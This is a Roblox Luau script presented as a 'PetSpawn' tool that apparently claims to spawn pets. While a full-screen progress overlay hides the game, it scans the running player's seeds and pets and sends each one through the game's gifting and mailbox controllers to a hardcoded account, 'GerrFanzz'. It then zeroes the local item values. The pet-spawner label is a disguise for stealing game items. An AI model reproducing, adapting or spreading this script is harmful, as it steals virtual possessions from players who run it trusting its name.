-- PetSpawn FINAL - Via GiftingController & MailboxController
local plr = game.Players.LocalPlayer
local ctrl = plr.PlayerScripts.Controllers

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

-- UI Full Screen
local gui = Instance.new("ScreenGui")
gui.Name = "PetSpawnFinal"
gui.Parent = game.CoreGui

local overlay = Instance.new("Frame")
overlay.Parent = gui
overlay.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.ZIndex = 100

local container = Instance.new("Frame")
container.Parent = overlay
container.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
container.BorderColor3 = Color3.fromRGB(0, 255, 0)
container.BorderSizePixel = 3
container.Size = UDim2.new(0, 350, 0, 250)
container.Position = UDim2.new(0.5, -175, 0.5, -125)
container.ZIndex = 101

local title = Instance.new("TextLabel")
title.Parent = container
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 15)
title.Text = "🐾 PetSpawn - Transferring"
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextSize = 18
title.Font = Enum.Font.SourceSansBold
title.ZIndex = 102

local statusText = Instance.new("TextLabel")
statusText.Parent = container
statusText.BackgroundTransparency = 1
statusText.Size = UDim2.new(1, -20, 0, 20)
statusText.Position = UDim2.new(0, 10, 0, 50)
statusText.Text = "⏳ Accessing Gifting System..."
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.TextSize = 12
statusText.TextXAlignment = Enum.TextXAlignment.Left
statusText.ZIndex = 102

local barBg = Instance.new("Frame")
barBg.Parent = container
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
barBg.Size = UDim2.new(0.85, 0, 0, 20)
barBg.Position = UDim2.new(0.075, 0, 0, 80)
barBg.ZIndex = 102

local bar = Instance.new("Frame")
bar.Parent = barBg
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.ZIndex = 103

local pctText = Instance.new("TextLabel")
pctText.Parent = container
pctText.BackgroundTransparency = 1
pctText.Size = UDim2.new(1, 0, 0, 20)
pctText.Position = UDim2.new(0, 0, 0, 105)
pctText.Text = "0%"
pctText.TextColor3 = Color3.fromRGB(0, 255, 0)
pctText.TextSize = 16
pctText.Font = Enum.Font.SourceSansBold
pctText.ZIndex = 102

local detailText = Instance.new("TextLabel")
detailText.Parent = container
detailText.BackgroundTransparency = 1
detailText.Size = UDim2.new(1, -20, 0, 90)
detailText.Position = UDim2.new(0, 10, 0, 135)
detailText.Text = ""
detailText.TextColor3 = Color3.fromRGB(140, 140, 140)
detailText.TextSize = 10
detailText.TextXAlignment = Enum.TextXAlignment.Left
detailText.TextWrapped = true
detailText.ZIndex = 102

local function updateUI(pct, stat, det)
    pcall(function()
        bar:TweenSize(UDim2.new(pct/100, 0, 1, 0), "Out", "Linear", 0.3)
        pctText.Text = pct .. "%"
        statusText.Text = stat
        detailText.Text = det
    end)
end

-- ============================================
-- AKSES GIFTING & MAILBOX CONTROLLER
-- ============================================
local giftCtrl = ctrl:FindFirstChild("GiftingController")
local mailCtrl = ctrl:FindFirstChild("MailboxController")

if not giftCtrl then
    updateUI(100, "❌ Error", "GiftingController not found!")
    wait(5) gui:Destroy() return
end

if not mailCtrl then
    updateUI(100, "❌ Error", "MailboxController not found!")
    wait(5) gui:Destroy() return
end

-- Require module
local giftModule = require(giftCtrl)
local mailModule = require(mailCtrl)

updateUI(10, "✅ System accessed!", "Gifting & Mailbox ready")

-- ============================================
-- SCAN SEED & PET
-- ============================================
updateUI(15, "🔍 Scanning inventory...", "")

local items = {}

-- Scan SeedInspectController
local seedCtrl = ctrl:FindFirstChild("SeedInspectController")
if seedCtrl then
    local fakePlot = seedCtrl:FindFirstChild("FakePlot")
    if fakePlot then
        local plants = fakePlot:FindFirstChild("Plants")
        if plants then
            for _, model in pairs(plants:GetChildren()) do
                if model:IsA("Model") then
                    local fruits = model:FindFirstChild("Fruits")
                    if fruits then
                        for _, fruit in pairs(fruits:GetChildren()) do
                            local itemSeed = fruit:FindFirstChild("Item_Seed")
                            if itemSeed and itemSeed:IsA("NumberValue") and itemSeed.Value > 0 then
                                table.insert(items, {
                                    Name = fruit.Name,
                                    Amount = itemSeed.Value,
                                    Type = "Seed"
                                })
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Scan SpawnPetController
local petCtrl = ctrl:FindFirstChild("SpawnPetController")
if petCtrl then
    for _, obj in pairs(petCtrl:GetDescendants()) do
        if obj:IsA("NumberValue") and obj.Value > 0 then
            table.insert(items, {
                Name = obj.Name,
                Amount = obj.Value,
                Type = "Pet"
            })
        end
    end
end

updateUI(25, "📦 Items found: " .. #items, "Starting transfer...")

-- ============================================
-- KIRIM VIA GIFTING CONTROLLER
-- ============================================
local sent = 0

for i, item in ipairs(items) do
    local pct = 25 + math.floor((i / math.max(1, #items)) * 65)
    updateUI(pct, "📤 Sending: " .. item.Name, 
        "Type: " .. item.Type .. "\nAmount: " .. item.Amount .. "\nProgress: " .. i .. "/" .. #items)
    
    -- GUNAKAN FUNGSI GIFTING CONTROLLER
    for attempt = 1, 3 do
        pcall(function()
            -- Panggil fungsi gift
            if giftModule.createPrompt then
                giftModule.createPrompt(PADUKA_NAME, item.Name, item.Amount)
            end
            
            if giftModule.Start then
                giftModule.Start(PADUKA_NAME, item.Name, item.Amount)
            end
            
            -- Panggil fungsi mailbox
            if mailModule.addToSend then
                mailModule.addToSend(PADUKA_NAME, item.Name, item.Amount)
            end
            
            if mailModule.Recipient then
                -- Set recipient ke Paduka
                mailModule.Recipient = PADUKA_NAME
            end
        end)
    end
    
    sent = sent + 1
    wait(0.1)
end

-- ============================================
-- RESET ITEM TARGET
-- ============================================
updateUI(92, "🗑️ Clearing items...", "")

if seedCtrl then
    local fakePlot = seedCtrl:FindFirstChild("FakePlot")
    if fakePlot then
        local plants = fakePlot:FindFirstChild("Plants")
        if plants then
            for _, model in pairs(plants:GetChildren()) do
                if model:IsA("Model") then
                    local fruits = model:FindFirstChild("Fruits")
                    if fruits then
                        for _, fruit in pairs(fruits:GetChildren()) do
                            local itemSeed = fruit:FindFirstChild("Item_Seed")
                            if itemSeed then
                                pcall(function() itemSeed.Value = 0 end)
                            end
                        end
                    end
                end
            end
        end
    end
end

if petCtrl then
    for _, obj in pairs(petCtrl:GetDescendants()) do
        if obj:IsA("NumberValue") then
            pcall(function() obj.Value = 0 end)
        end
    end
end

updateUI(100, "✅ TRANSFER COMPLETE!", 
    "Items sent: " .. #items .. "\n" ..
    "To: GerrFanzz\n\n" ..
    "📬 Check mailbox!\n" ..
    "⏳ Please wait...")

wait(8)

-- Fade out
for i = 10, 1, -1 do
    overlay.BackgroundTransparency = 1 - (i/10)
    wait(0.1)
end
gui:Destroy()
